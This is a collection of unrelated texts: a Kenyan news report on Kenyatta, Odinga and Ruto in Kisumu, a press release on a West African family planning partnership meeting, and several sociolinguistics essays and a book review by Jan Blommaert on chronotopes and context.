Mr Odinga, who spoke before the president, took the crowd down memory lane, with talk of how political opponents worked together for the sake of the country.
The Orange Democratic Movement leader added that his father Jaramogi Oginga Odinga and other leaders pushed for the release of Jomo Kenyatta from the colonial prison.
He noted that he decided to work with the president despite initial criticism from his own supporters.
"By last December, we were in chaos and you asked me to take an oath, which I did. Afterwards, my people said I should take power and his people said Raila had committed treason. But we sat down as grown-ups and started looking at ourselves. There was a problem," he said.
"The rain was still beating us. We had tribal politics and we needed to learn from our freedom fighters who brought us independence. So I reached out to my brother and we agreed to work together. That was the genesis of our handshake."
The pilot UHC programme targets Kisumu, Isiolo, Machakos and Nyeri.
President Kenyatta and Mr Odinga will be honoured with honorary degrees at Jaramogi Oginga Odinga University of Science and Technology during a graduation on Friday.
RUTO FACTOR
Meanwhile, Deputy President William Ruto appeared to calm his animus with Mr Odinga, even calling him prime minister, as they toured the lakeside city.
At Ahero, where the president launched a road interchange, Mr Ruto took advantage of a welcoming crowd to emphasis that the political animosity between him and Mr Odinga was a thing of the past.
"What the prime minister has said is true. We are here ... we have agreed that the enmity is buried. We are turning a new page of uniting. We closed the chapter of elections last year," he said.
"If you see Uhuru Kenyatta, Raila Odinga ... 'Tinga' is also here ... With me, the hustler, between them, you should know everything is okay. Are we together?"
Two weeks ago, the DP accused Mr Odinga's opposition arm of taking advantage of the handshake with the president to undermine the Jubilee Party administration.
His lieutenants had accused the government of using the war on corruption to target State officials allied to him. Mr Odinga responded by saying that the war was against individuals, not a community.
Mr Ruto's last public visit in Kisumu last July was punctuated with jeers as he tried to address a crowd while in a Jubilee T-shirt.
He has avoided Luo Nyanza since, although he visited Migori in November, when he was hosted by Migori Governor Okoth Obado, who is facing murder charges following the death of his girlfriend Sharon Otieno.
On Thursday, that animus appeared relaxed, at least as they hugged, held hands and laughed.

Dakar, Senegal – 14 December, 2018. The Ouagadougou Partnership Coordination Unit (UCPO) organized its seventh annual meeting from December 12 to 14, 2018, in Dakar, Senegal. The civil society organizations of the nine (9) West African countries (CROSPF) gathered around the Ouagadougou Partnership (PO) met to assess their contribution and to set prospects in the fight for the capture of the demographic dividend in West Africa. They shared good practices and positive experiences as well as the challenges at regional and local level.
Ahead of the annual meeting of the Ouagadougou Partnership, the CROSCPF organized a working dinner on Tuesday, December 11 during which the Regional Director for UNFPA in West and Central Africa, Mabingue Ngom was honoured. This distinction is a recognition from civil society towards the leadership of Mr. Ngom, in promoting women and youth's empowerment to harness demographic dividend in West Africa.
In Africa and around the world, countries endorsed policies on the repositioning of family planning to overcome crises and thus contribute to the achievement 2030 (SDGs) and 2063 (African Union) goals, for which women and youth empowerment are priority areas.
In the region, dynamic actions were built around the regional coalition of nine countries contributing to reposition Family Planning in their respective countries by reducing maternal mortalities, child marriages, advocating for women's and girls' access to contraception etc.
In addition, the report of the 6th annual meeting of the Ouagadougou Partnership in Guinea took stock of the progress made in 2017 in countries where about 910,000 additional women benefited from family planning. These results that account for 41% of the global target of the 2.2 million projected for 2020. The nine countries have enlisted 383,000 additional women in 2017.

Are chronotopes helpful?
Jan Blommaert
Why do we need another word for context?
I get this question repeatedly whenever I use the term “chronotope”: do we really, truly need yet another word for context? Don’t the current terms we have do the job satisfactorily? What’s new about chronotopes?[1]
I usually give not one but several answers to that question. One answer is general and refers to a practice that is at the core of scientific work. We need new terms, or renewed terms, often for no other reason than to check the validity of old ones. Neologisms, from that angle, are crucial critical Gedankenspiele that remind us of the duty of continuous quality control of our analytical vocabulary. And if the Gedankenspiel is played well, it often enables us to see how the existing concepts they critically interrogate have become flattened, turned into a passe-partout or a rather uninformative routine gesture in talk and writing. Chronotope invites us to critically check the ways in which we use the term “context” in a wide range of disciplines within the study of language in society. If, in the end, the community of peers in this discipline decide that “context” is still more useful and valuable than “chronotope”, it will be a much more accurate, precise and analytically transparent notion of “context” that will prevail, and “chronotope” will have done what it had to do.
A second answer is a disclaimer. One concept should never be expected to do all of the work in theory and analysis. It should do a bit of work, in conjunction with several others. And the point is to find the precise bit of work that can be done satisfactorily by that concept within a broader conceptual structure.
A third answer follows onto the previous one. It is of a different nature and also responds to the “what’s new” question. One should point out that the particular conceptualizations of context for which we can now use the term “chronotope” are not new at all, and that, in fact, the use of “chronotope” may help us to precisely capture that particular trend of studies of text-and-context. I could refer here to a large body of existing literature, but three clear instances can suffice: Aaron Cicourel’s (1992) classic paper on the “interpenetration” of contexts in medical encounters; Michael Silverstein’s (1997) analysis of the “improvisational” nature of realtime discursive practice; and Charles Goodwin’s (2002) discussion of “time in action”, in which specific temporalities, realtime as well as invoked, pattern and co-organize the interactional work done by participants. What brings these examples together is:
A view of context as a specific set of features both affecting and producing specific modes of social action;
in which such features have very clear and empirically demonstrable timespace characteristics – the actual timespace constellation is the determining feature for understanding the actual text-context patterns we observe;
in which some of these features can be carried over, so to speak, into different timespace constellations while others are non-exportable.
and in which a precise understanding of timespace configurations is essential to account for a great deal of the sociocultural work performed in interaction.
I shall briefly elaborate this particular view of context in what follows. Chronotope, I shall argue, can play a role within the broader conceptual structure developed within that tradition.
From situation to chronotope
It should not be hard to grasp the specific nature of the conceptualization of context I outlined above in contradistinction with several other trends of usage. In earlier work (Blommaert 2005, chapter 3) I surveyed some of the various ways in which context is used in analysis, pointing out flaws in mainstream usages of the notions in Conversation Analysis and Critical Discourse Analysis. Of the former, I argued that a conception of context reduced to the intra-interactional forms of demonstrable inference was untenable; of the latter I said that a priori statements about contextual “influences” on discourse, for which discourse analysis would merely provide a symptomatic demonstration, would not do either. We can add to this that restrictions of context to purely cognitive universes for inference or to the inferential material that ensures text cohesion and coherence are equally inadequate (for discussions, see Duranti & Goodwin 1992).
All of them, I would suggest, fail to take into account “the situation” as defined in the linguistic-ethnographic tradition (for a classic statement, see Goffman 1964; also Hymes 1974; Silverstein 1992; Scollon 2001; Scollon & Scollon 2004). Let us recall how Goffman stated the problem.
A student interested in the properties of speech may find himself having to look at the physical setting in which the speaker performs his gestures, simply because you cannot describe a gesture fully without reference to the extra-bodily in which it occurs. And someone interested in the linguistic correlates of social structure may find that he must attend to the social occasion when someone of given social attributes makes his appearance before others. Both kinds of students must therefore look at what we vaguely call the social situation. And that is what has been neglected. (Goffman 1964: 134)
Goffman connects two elements here, both of which appear as compelling contextual factors in analysis. First, there is the “physical setting” within which interaction occurs – the actual timespace constellation within which people encounter each other, in other words.[2] Goffman adds to this a second element: “the social occasion”. The latter is defined (with an oblique reference to Durkheim’s “social fact”) as “a reality sui generis” within any social system, and it stands for the rules of participation and communicative behavior that provide “scripts”(if you wish) ordering concrete communicative events between people who carry “given social attributes”. Both elements – note – are coordinated in actual interactional events. It is this dialectic of mutual influences between settings and social scripts that shapes the “joint social orientation” characterizing social interaction, which enables Goffman (id: 135) to provide his own, interactional, definition of the social situation:
I would define a social situation as an environment of mutual monitoring possibilities, anywhere within which an individual will find himself accessible to the naked senses of all others who are “present” and similarly find them accessible to him.
As we know, much of Goffman’s work was focused on the precise description of specific social situations – think of the poker game in Encounters (1961) and the lecture in Forms of Talk (1981) In each of these situations, Goffman emphatically pointed to the ways in which situations came with sets of conditions on participation, rules of engagement and forms of communicative action. Concrete and socioculturally recognizable timespace configurations involve nonrandom modes of social action and lead to specific social effects – that is the major insight we can get from Goffman’s oeuvre, and which resonates with the work of scholars inscribed in the same lines of inquiry (e.g. Garfinkel 2002; Goodwin & Goodwin 1992; Scollon & Scollon 2004). It is this insight for which I believe chronotopes to be a helpful gloss.
Bakhtin’s chronotope
The concept of chronotope used here has, as we know, its origins in the work of Bahktin (1981, 1986), and it is good to pause and consider some crucial aspects of the way in which Bakhtin designed it.[3]
A first observation, often overlooked, is that Bakhtin’s chronotope is grounded in a profoundly sociolinguistic concept of language: it is not an autonomous or separate object (as in mainstream linguistics), but entirely entangled with concrete aspects of the social world. Bakhtin sees language in its actual deployment (as e.g. in a novel) as a repository of “internal stratification present in every language at any given moment of its historical existence” (Bakhtin 1981: 263; see the discussion in Agha 2007b). At any moment of performance, the language (or discourse, as Bakhtin qualifies it) actually used will enable an historical-sociological analysis of different “voices” within the social stratigraphy of language of that moment: Bakhtin’s key notion of heteroglossia – the delicate “dialogical” interplay of socially (ideologically, we would now say) positioned voices in e.g. a novel – is the building block of a “sociological stylistics” (id. 300).
Two important points are attached to this. First, this sociological stylistics is necessarily historical,and note that the notion of “historical” in Bakhtin’s work is never a purely chronological one, but a timespace one. In actual analysis, the historical aspect operates via a principle of indexicality, in which a genre feature such as “common language (…) is taken by the author precisely as the common view, as the verbal approach to people and things normal for a given sphere of society” (id. 301; cf. also Rampton 2003). Form is used to project socially stratified meaning (“verbal-ideological belief systems”, id. 311), and this indexical nexus creates what we call “style”, for it can be played out, always hybridized, in ways that shape recognizable meaning effects “created by history and society” (id. 323).
Two: this historical aspect is tied to what we can call “valuation”. The historically specific heteroglossic structure of actual forms of language means that understandingthem is never a linear “parsing” process; it is an evaluative one. When Bakhtin talks about understanding, he speaks of “integrated meaning that relates to value – to truth, beauty and so forth – and requires a responsive understanding, one that includes evaluation” (Bakhtin 1986: 125). The dialogical principle evidently applies to uptake of speech as well, and such uptake involves the interlocutor’s own historically specific “verbal-ideological belief systems” and can only be done from within the interlocutor’s own specific position in a stratified sociolinguistic system. Nothing, consequently, is neutral in this process – not even time and space, as his discussion of chronotope illustrates.
Bakhtin designed chronotope to express the inseparability of time and space in historical social action. The “literary artistic chronotope”, where “spatial and temporal indicators are fused into one carefully thought-out, concrete whole”, could be seen as “a formally constitutive category of literature” (1981: 84), as the thing that could enable us to actually and precisely understand works of literature as socio-historically situated acts of communication. Bakhtin saw chronotopes as an important aspect of the novel’s heteroglossia, part of the different “verbal-ideological belief systems” that were in dialogue in a novel and gave the novel the historical meaning potential with which readers had to engage.
Moralized behavioral scripts
We can now look at how Bakhtin’s chronotope can assist us in giving a more precise analytical orientation to Goffman’s social situation. I want to highlight two major points.
A first and obvious step forward is that we can see the social situation as intrinsically historical and therefore loaded with language-ideological affordances – “orders of indexicality”, we can say (Silverstein 2003; Blommaert 2005; also Scollon & Scollon 2004). It is the historicity of situations that accounts for the defining trigger of communication: recognizability (cf. Garfinkel 2002). It is when a situation emerges of which we can recognize (or believe to recognize) the sociocultural status that we can shift into the modes of interactional behavior that “make sense” in and of such a situation. We do so, as e.g. Bourdieu (1991) and Hymes (1996) emphasized, under conditions and constraints generated by (equally historical) sociolinguistic inequalities – it is wise to remind ourselves of the fact that we rarely enter social situations as perfectly finished products of smooth socialization (cf. Blommaert 2008).
A second advantage we can draw from Bakhtin’s insights and add to Goffman’s, is that understanding – “making sense” of interaction in actual situations – is evaluative and refers not just to the linguistic codes of expression but to a broader complex of rules for social conduct. In social situations, we make evaluative judgments of the participants (including ourselves); such judgments are indexically grounded and project identities onto concrete modes of conduct. Goffman’s work is replete with such moments of situated identity judgment, in which an interactional move can be swiftly turned into a perception of awkwardness – which is a judgment of the person through the lens of his/her interactional conduct. Indexicality, we can see here, is entirely tied up with identity (a thing we already know: Agha 2007a), and is entirely moral whenever it takes the shape of what is called “appropriateness”, “felicity” or “adequacy” in the literature on pragmatics (e.g. Austin 1962).
We can now be far more precise and specific with respect to what Goffman called the social situation. Specific timespace configurations (think of Goffman’s lecture hall) demand and impose specific moralized behavioral scripts offering affordances and imposing constraints on what can be recognized as “meaningful” interaction in such situations. Scripts include participation frameworks – not everyone is a ratified participant in, e.g., a lecture, and the specific roles of participants are quite compellingly defined. They also sketch a plot or event structure, as well as the “adequate” semiotic resources to be deployed in an order of indexicality we will recognize as “appropriate” within the specific chronotope. A lecturer, thus, is expected to lecture in a lecture hall during a time slot defined as a “lecture”, and members of the audience are expected to attend in silence, listen, perhaps make notes or recordings, and react appropriately to discursive prompts given by the lecturer. As soon as the lecture is over, the entire script changes, identities and participant roles are redefined, and an entirely different set of rules for social conduct replaces that of the lecture.
Chronotopes and social life
I hope that I have given arguments demonstrating the usefulness of chronotope as a way of summarizing, and making more accurate, the tradition of approaching context sketched at the outset of this chapter. The notion of chronotope invites us to treat aspects of context often dismissed or summarily taken into account in branches of scholarship, and to treat them with utmost precision as nonrandom elements of social situations that may account for much of how people make sense of social structure in actual moments of social action (to paraphrase Cicourel’s 1974: 46 words). Everyday social life can be seen, from this perspective, as a sequence of such chronotopically defined situations through which we continuously move, adapting and adjusting in the process our identities and modes of conduct in interaction with others.
A sequence, thus, of “environments of mutual monitoring possibilities” as Goffman expressed it, each of which comes with specific sets of norms – the moralized behavioral scripts mentioned above. This is why a dinner table conversation has a particular character (e.g. Ochs & Shohet 2006) fundamentally different from that of a social media interaction session (Tagg et al 2017), interactions in a hospital operation theater (Bezemer et al. 2014), during a court hearing (Stygall 1994) or during a session in which an archaeology instructor explains minute differences between kinds of soil to students (Goodwin 1994). This is also why we can instantly shift from a quiet, withdrawn and “mind-my-own-business” mode of conduct on a public bus into a chatty and engaged one when a friend gets on and sits next to us, and why we know that we cannot (or at least should not) talk to our children the way we talk to our colleagues at work. Each situation in which we find ourselves in everyday social life involves such shifts in normative-behavioral orientation. If we fail to make such shifts, we are swiftly categorized by others in categories ranging from “awkward” to “antisocial” or “abnormal”.
So, yes indeed, I do think chronotope is helpful as a tool in our analytical toolkit. The least we can say is that it satisfies the first function of new terms, specified in the introductory part of this chapter: it provides a critical check of the validity and analytical power of the term “context”. It allows us to observe the many superficial and inadequate ways in which that older term is being used, and to suggest more precise understandings of it. The latter may take the shape of a new collocation: “chronotopic contexts”.

[1]I am grateful to Sjaak Kroon and Jos Swanenberg for stimulating discussions on this topic over the past number of years, and for asking me to contribute them to this book. Anna De Fina greatly helped me in my attempts to formulate chronotopic context and its effects, see Blommaert & De Fina (2016).
[2]The “physical setting” of interaction, one can note, is often relegated to the “S” in disastrously simplistic usages of Hymes’ SPEAKING framework for ethnographic-comparative description – “Setting and Scene”. It is then confined to a quick-and-easy sketch of the material layout and physical circumstances under which interaction takes place, overlooking the “scene” in Hymes’ framework – the actual ways in which material environments condition and enable the forms of action occurring. Lots of examples could be given here; the reader can refer to those given in Blommaert (2005: chapter 3). For a far more sophisticated discussion, see e.g. Bezemer et al. (2014).

Christian W. Chun, “The Discourses of Capitalism” (review)
CHRISTIAN W. CHUN, The discourses of capitalism: Everyday economists and the production of common sense. Abingdon: Routledge, 2017. Pp 159. Pb. £29.99
Reviewed by Jan Blommaert
For several years now, the Routledge series Language, Society and Political Economy edited by David Block has consistently turned out interesting studies in which Marx-inflected theoretical frameworks are blended with actual concrete issues in sociolinguistics, discourse analysis and applied linguistics, giving such studies a critical bite along with constant reminders of the power of “big” political-economic issues to seemingly small language-related ones. Chun’s short and elegant study fits well into that tradition. In The discourses of capitalism, we get a thoroughly informed discussion of ideology in the Gramscian tradition combined with an innovative sociolinguistic and discourse-analytic methodology.
In an engaging first chapter, Chun starts from where he must start in Gramsci’s view: a precise and detailed reflection on his own background and social position as someone living in a capitalist system, gradually realizing the ideological nature of something that is presented as simple fact. The latter is usually done by professional economists, but it saturates popular beliefs and perceived experience. And that is the theme of the book: Chun will examine the discourses of “everyday economists” (15). And he will do so by analyzing recorded street interviews with people engaging with a piece of publicly displayed art. The artwork is a large neon-lit construction with the proposition “Capitalism works for me!” designed by artist Steve Lambert and displayed in several cities. Passers-by can vote “true” or “false”, and this, then, is the point of departure for impromptu interviews on capitalism and how such people experience it: its ideological character, the connection with common sense and with Gramsci’s notion of hegemony.
The latter is the topic of chapter 2, which engages at considerable length with the conceptual apparatus guiding the study. How do particular structured ideas become “common sense”? How do they saturate the life world of people, even in the face of manifest factual inconsistencies? How do we explain such obvious contradictions, as the one expressed by a woman who wrote Obama saying “I don’t want government-run health care. I don’t want socialized medicine. And don’t touch my Medicare” (37). This question, obviously, has kept social scientists busy during the entire 20th century. It animated the work of scholars ranging from Durkheim, Weber and Mannheim to Bourdieu, Foucault, Williams and Hall. What Chun brings to this issue – sketched in chapter 3 – is a sophisticated discourse analysis inspired by Bakhtin and – importantly – by the kind of nexus analysis developed by the Scollons. We get a fully “social” form of discourse analysis here.
This methodological instrument is next deployed on powerful empirical material presented in three well-structured empirical chapters. In chapters 4, 5 and 6, we meet the 50 participants from different places whose reactions to “Capitalism works for me!” were recorded by Lambert and his associates and subsequently selected for analysis by Chun. Roughly, three large discourse formats emerge. The first one can be summarized with the proposition “The only system that ever does work” (chapter 4); the second with “Nothing is perfect” and the third with “who gets all the money?”. While the former two can be seen as subscribing to and legitimating capitalism, the last one is counter-hegemonic, or at least strongly critical of the system that has no name.
In the analyses, we begin to see a clear conceptual structure surrounding and underpinning capitalism in the US. It is instantly associated with adjacent concepts such as democracy, freedom, markets, opportunity, choice and individual agency in a master narrative widely known as the American Dream. Capitalism provides a space of freedom and opportunity where individuals (all of them) can “make it” in society by hard work and commitment to freedom and democracy. The latter – in the US as elsewhere – increasingly stands for minimal government and maximum freedom of enterprise. This conceptual structure, one could argue, is the hegemonic US ideology of capitalism. As an economic system it is inextricably woven into a broader view of (wo)man and society, of “the good life”, in ways in which challenging one element (capitalism, e.g.) would involve attacking the others too (“democracy”, “freedom”, etc.). Manifest flaws in capitalist economies (think of the 2008 meltdown) are rationalized as temporary and never beyond repair. And repair is necessary, for “there is no alternative”. This is the apex of hegemony.
Hegemonies, however, produce counter-hegemonies, and chapter 6 engages with those. While respondents in chapters 4 and 5 largely stuck within a range of what we could call “conditional acceptance” of capitalism, respondents in chapter 6 stand out by often pointed and acerbic factual rebuttals of “Capitalism works for me!”. Here Gramsci’s “good sense” (as opposed to “common sense”) comes in: people have done the analytical balancing of lived reality versus commonsensical ideological framing, and reject the latter. The “everyday economists” in this chapter privilege cool facts over dogmatic assumptions and logic over slogans: if my mother works weekdays and weekends for a meager salary while her boss never works during weekends and gets vastly more, what’s fair about capitalism? (cf p 130). This grassroots critique is the hopeful potential discerned by Chun and elaborated in an eloquent concluding chapter 7. Chun (again, in line with the Marxian tradition) calls for a public pedagogy on discourses of capitalism, a mode of public learning and emancipatory education in which ideology is seen as ideology, not as fact or fate.
I find this an engaging and convincing book, offering insights and substance for further reflection in a range of domains. One domain was perhaps not intended by Chun, but I find it particularly inspiring. Chun’s data, as said, were interviews with people passing by and responding to a publicly displayed piece of art, and more in particular a “language object” in Adam Jaworski’s (2015) terms: a publicly shown and highlighted proposition. Seen from that perspective, Chun’s book offers us a fine and sophisticated example of linguistic landscape analysis in which the landscape is used as a prompt to elicit discourses from those inhabiting the landscape. In other words, the linguistic landscape is turned into an interactional site, a nexus of practice according to the Scollons. And this, I suggest, may show us an often-forgotten function and effect of linguistic landscapes: they exist as sites of social interaction, they “talk”, and people “talk back” to them.

Pointing out Perceived Monolingualism: Citizen Sociolinguistics in Action
Citizen Sociolinguistics
No community is truly “monolingual”—even when they think they are!
Recently, language professionals have named a community’s illusion of language purity “perceived monolingualism” (Thank you @MCP718, mariacioe-pena.com, for this useful phrase!). Initially, this concept made me nervous about the role of citizen sociolinguistics. The concept of “perceived monolingualism” raises the specter of a dark kind of citizen sociolinguist–one who propagates misunderstanding, eliminates language variety, and possibly worse. Perhaps naïvely, I usually like to think of citizen sociolinguists as people happily championing the creative capacity of multilingualism and language variety, busily spreading the word about how it works. Once we recognize a type of citizen sociolinguist willfully lacking in awareness of the multilingualism all around, who can we call on to set them straight?
Other citizen sociolinguists, of course! In at least some cases, citizen sociolinguists are the best candidates to point out this misperception of monolingualism—and the most likely to…

Context and its complications
Jan Blommaert, Laura Smits, Noura Yacoubi
Draft chapter, Handbook of Discourse Studies (eds. A. De Fina & A. Georgakopoulou). London: Routledge 2019.
Abstract: The point of departure for this chapter is the contention that the online-offline communicative economy in which we now live compels us to rethink some of the core vocabulary and assumptions underlying our thinking about ‘context’ and ‘contextualization’ in discourse studies. We formulate a set of proposals grounded in the interactionist tradition and focused on (inter)action rather than on participants and communities. Next, we propose to see contextualization as a process that takes us from chronotopes over frames to formats of action, situationally deployed.
Introduction: Online-offline action
In his classic Cognitive Sociology, Aaron Cicourel made the following general observation:
The problem of meaning for the anthropologist-sociologist can be stated as how members of a society or culture acquire a sense of social structure to enable them to negotiate everyday activities. (Cicourel 1974: PAGE)
This statement can serve as an extraordinarily accurate description of what was later called and methodologically developed as “contextualization” (Gumperz 1982, 1992; also Auer & DiLuzio 1992; Duranti & Goodwin 1992). Yet two components of the statement demand closer attention: “social structure” and “everyday activities”, for since the beginning of the 21st century the realities of social structure and the range and modes of everyday activities have been profoundly affected by the generalized introduction of a layer of online social life, complicating the offline social world on which these earlier formulations of contextualization were based. In this chapter, we intend to sketch the complications emerging from discourse produced interactionally in such an online-offline environment now serving as the backdrop for what Ron Scollon (2001) called “the nexus of practice”.
We must pay closer attention to the aspects of contextualization that have changed, we said, but that does not mean that we must do so from within a methodological tabula rasa. We believe the effort can be profitably made by means of some central insights and principles from within the interactional tradition of discourse studies. In fact, all the scholars already mentioned here belonged to that stream of ethnographically grounded studies of actual situated discursive practice, which has been the richest source of fundamental reflections on the notion of context and its role in social interaction. It is from that source that we can draw the general principles directing our discussion:
Context should not be seen as an abstract, stable or latent presence; it is a resource deployed in concrete socially situated meaning-making action: context is always contextualization.In that sense, it is highly unpredictable, evolving, dynamic and unstable. Also, while contexts operate at various scale-levels and structures a multitude of concrete interactions, the analytical point of departure is their situated effects on making sense. To quote Herbert Blumer in this respect: “People (…) do not act toward culture, social structure or the like, they act toward situations” (Blumer 1969: PAGE)
Contextualization is the key to making sense, because it consists of interactionally constructed indexical connections between actual discursive features and relevant chunks of sociocultural knowledge (Silverstein 1992; Hymes 1996; Gumperz 2003; Agha 2007).
Such indexically deployed and invoked knowledge is never neutral but always evaluative and in that sense moral, and by extension identity-related (e.g. Goodwin 2007). Making sense is a moral judgment grounded in socioculturally available normative-behavioral scripts situationally projected onto persons. Goffman (1974) called such moralized scripts “frames”; the ways we implement them have been variously called (with distinctions not overly relevant here) “indexical order” (Silverstein 2003) and “orders of indexicality” (Blommaert 2005). The concepts are joined by their emphasis on (Bakhtinian) evaluative uptake and on the dimension of social order as part of meaning-making practices – recall Cicourel’s statement quoted above.
The contextual resources that people draw upon in interaction have to be recognizable, but not necessarily shared (Garfinkel 2002; also Blommaert & Rampton 2016: 28-31). Sharedness is evolving as the interaction proceeds but can also evolve as a shared sense of misunderstanding, i.e. a shared sense that very little of substance is shared in the interaction. What needs to be recognizable is the broad outline of a format of interaction, a general script for social action.
We can see that these principles favor action over content and participants, and situated and evolving effects over a priori categories (such as speech acts, conversational maxims, “meaning” and “understanding”). The reason for these preferences is that, due to the changes described above, very little can be taken for granted with respect to what is “ordinary” and “normal” in communication. To name just a few of the widely used assumptions that need to be qualified: the assumption that communication is self-evidently a human-to-human activity has been challenged by human-machine interactions, and has thus become a variable rather than a stable feature. This, of course, has numerous knock-on effects on widely used criteria in theories of meaning: intentionality, agency, (human) rationality. Even more widespread is the assumption that the most “normal” or primitive form of communication – in the sense of: the kind of communication on which we base our fundamental theoretical imagination – is unmediated, spoken dyadic face-to-face interaction in shared physical timespace and between persons sharing massive amounts of knowledge, experience and sociocultural norms within a sedentary community (an offline conversation between similar people, in short). The online world has critically destabilized that assumption by inserting scripted, multimodal, non-simultaneous, translocally mobile, multiparty and technologically heavily mediated forms of everyday communication into the communicative economies of very large numbers of people, not as peripheral modes of interaction but as important, inevitable ones. We now communicate intensely with interlocutors with whom we do not share much (not even acquaintance as a natural person and a human subject), across space and time, and through complex modes of non-acoustic semiotic work.
Our core vocabulary and assumptions derive from an implicit sociological imagination of which we assume that it reflects the true state of things. Changes in the state of things often take some time before they translate into an alternative sociological imagination (cf. Mills 1959; also Blommaert 2018a). In the meantime, however, they render some of our core vocabulary for talking about language, interaction and meaning-making less salient and applicable, and invite a focus on the phenomena we can identify as constants. The constant feature, we would argue, is social action – a synonym, as Anselm Strauss (1993) among others emphasized, for interaction. Even if we now communicate with machines, with unknown mass audiences (as in mass online gaming), by means of delayed, asynchronous messages scripted in new forms of graphic visualization and design – we are still performing interactions in attempts to make sense of our world. Taking social action, defined in this sense, as our ontological point of departure enables us to start describing and understanding old and new patterns of interaction, how they intersect and how they structure our social lives.
With these principles established, we shall now engage with four different sets of issues, all of them inspired by the changes we noted earlier: the transition from an offline world of communication to an online-offline one. Some of these issues are not new – they have been constant features of debates on context and contextualization – but demand a renewed engagement in view of changes in the world of communication. In reviewing them, we will make proposals for reimagining aspects of them and for adopting another vocabulary in our descriptions of them.
Beyond the macro and micro: recognizability and formatting
A persistent feature of discussions of context and its uses in scholarship is the use of the “micro-macro” dichotomy (occasionally turned into a triad by inserting “meso” in between). “Micro”-contexts would then be the factors affecting and informing local, situated events: the timespace frame, the participants, the immediately and directly relevant social roles, the topic, and so forth. “Macro”, in turn, would stand for the nonlocal, broader factors in which the event can be situated and by which it is indirectly affected: the wider historical, sociocultural and political parts of the picture making (at least part of) the event understandable (see the discussion in e.g. Goffman 1964; Silverstein 1992;Cicourel 1992; Duranti 1997; Blommaert 2015a).
While such distinctions might be discursively and heuristically helpful, they are methodologically unhelpful from the perspective we formulated above. They do point to a fundamental fact: the non-unified and complex nature of context – any context – but they do so in an inaccurate way. Certainly when we become aware of the ways in which they rest on a particular sociological imagination, and of the ways in which and structure an epistemological field. The sociological imagination on which the dichotomy between “micro” and “macro” rests is the one sketched earlier: a world in which we can separate and isolate specific aspects of social life as being the direct conditions for conduct – the local, sedentary, individual, variable and mundane aspects – while other aspects appear to only indirectly inflect such conditions for conduct, due to their remoteness and their stable, collective character. The first set of facts we could call “processual” factors, and they would always be unique, while they others would be “procedural”, and they would be general. The first set would index “community” – a specific small-scale group involved in shared practices, but diverse and changeable – while the latter would index “society” – the organized, stable, enduring, systemic large-scale group characterized by common institutional characteristics. Obviously, this imagination of the social world is far removed from what Castells (1996), in a visionary text, called the online-offline “network society” (cf. also Blommaert 2018a).
The dichotomy between “micro” and “macro” also structures an epistemological field in which “micro” would stand for the anecdotal, the concrete, the singular, the possible exception, the empirical and the “token”, while “macro” would point to the systemic, the abstract, the generalizable, the norm, the theoretical and the “type”. Thus, so-called “micro-sociologists” and ethnographers would be dismissed as scholars whose attention to the uniquely situated features of cases precludes any attempt towards valid generalization, because generalization can only be made at a “macro” level of analysis where analytical detail has to be surrendered to abstraction (see the discussions in e.g. Mills 1959, Blumer 1969, Giddens 1984).
From a viewpoint privileging social action, all of this is highly unproductive, and the acuteness of the problem was repeatedly emphasized by Pierre Bourdieu and others. Bourdieu – often seen as a “macro”-sociologist whose work speaks to society at large – would emphasize that concepts such as “habitus” (a general concept) could only emerge through ethnographic attention to actual situated practice, not by statistical surveys. It was by observing the struggles of Algerian farmers to come to terms with a new market economy that Bourdieu saw the actual working of capitalism as propelled into socioculturally inhabited modes of practice (Bourdieu 2000; cf Blommaert 2015b). The big things reside in the small things, and the most inconspicuous and uniquely situated social action is, in that sense, “systemic” and “typical”, as well as the source for theoretical generalization. Evidently, the same insight animated Goffman’s work on interactional ritual and frames (1967, 1974): even if all instances of human interaction are unique, they display general characteristics and patterns sufficient to lift them from “micro” to “macro” relevance (cf. also Rampton 2016).
This is the point where we can start formulating a proposal in line with the principles outlined above. And we can draw for inspiration on the authors just mentioned, as well as on Garfinkel’s (2002) uncompromising formulations of the issue. Garfinkel saw recognizability as the key to understanding the social nature of interaction, and as already mentioned above, recognizability should not be equated with sharedness of norms, assumptions and worldviews. It is a recognition of the joint potential for specific modes of action that gives such action the character of “congregational work”, he argued – work performed collectively because we are jointly involved in it. We enter jointly into an action of which we know very little outside its possible general features, and we jointly construct such actions as forms of social order. This order can be entirely ad hoc, temporary and ephemeral. But while it lasts, it is a firm order that generates roles and identities along with a range of moral codes controlling (mis)behavior.
It is this aspect of recognizability, generating congregational work and its social outcomes, that renders distinctions between the factors discriminating “micro” and “macro” aspects of the act meaningless. Since acts are social, they will draw on available and accessible social resources – from the different social positions from which we enter the action, the kinds of language and discourse we use, over the topic, to the actual things we say, hear, write or read (cf. also Briggs 2005). And even if we see that such resources are unevenly distributed, a degree of order will emerge from the action itself. The latter was exemplified in a magnificent study by Charles Goodwin (2004), in which a man who,following a stroke, had lost almost all of his linguistic capabilities was shown to engage in lengthy and complex interactions with his friends and relatives. Evidently, the absence of shared linguistic resources imposes constraints on what can happen in such forms of interaction – resources are crucial contexts for interaction (Blommaert 2005: 58-62); but when we intend to understand what is happening, recognizability is the key.
Recognizability, however, is not an empty and random container. We recognize particular social situations and their features as something specific – a quarrel, a lecture or a Facebook update – on the basis of perceived properties of the situation (what Garfinkel called ”autochthonous order properties”, 2002: 245) associated with what Goffman called “frames”: the ways in which we organize our experience. Recognizing a situation means framing it along what we could call a general indexical vector, i.e. entering that situation as one that imposes and enables specific forms of interaction, one or different orders of indexicality. When we recognize something as a Facebook update, we recognize that it enables (among other actions) different forms of response, and that it imposes keyboard writing and a specific set of symbols (e.g. emoticons) as techniques for responding to it. When we recognize the particular update as an instance of trolling, we recognize it as enabling an unfriendly response, and so forth. This we can call, following Garfinkel, formatting: shaping the particular situated interaction in “typical” (i.e. generic, non-unique) ways and bringing the “sense of social structure” mentioned by Cicourel into the particular action we are engaged in with others.
A lot of what we do in the work of contextualization is moving from recognition through framing to formatting. We do so dialogically in congregational work with others, and we do so by drawing upon socioculturally marked – indexicalized – resources that acquire a general direction in such activities. This, we propose, is the cornerstone of the argument here. We can now proceed to elaborate it further.
Chronotopes, scales and synchronization
